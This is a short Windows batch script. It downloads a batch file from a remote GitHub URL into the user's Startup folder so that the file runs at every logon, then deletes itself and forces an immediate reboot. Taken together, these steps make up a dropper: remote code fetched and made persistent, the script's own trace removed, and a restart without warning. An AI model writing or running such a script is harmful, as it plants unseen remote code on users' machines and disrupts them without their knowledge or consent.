@echo off
setlocal

REM URL to download the batch script from
set "url=https://raw.githubusercontent.com/wicorn29/batch/main/up.bat"

REM Location to save the downloaded script
set "script_path=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\your-script.bat"

REM Download the batch script
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%script_path%')"

REM Check if the download was successful
if exist "%script_path%" (
    echo Script downloaded successfully.
) else (
    echo Failed to download the script.
    exit /b 1
)

REM Delete this batch file
del "%~f0"

REM Reboot the computer
shutdown /r /t 0
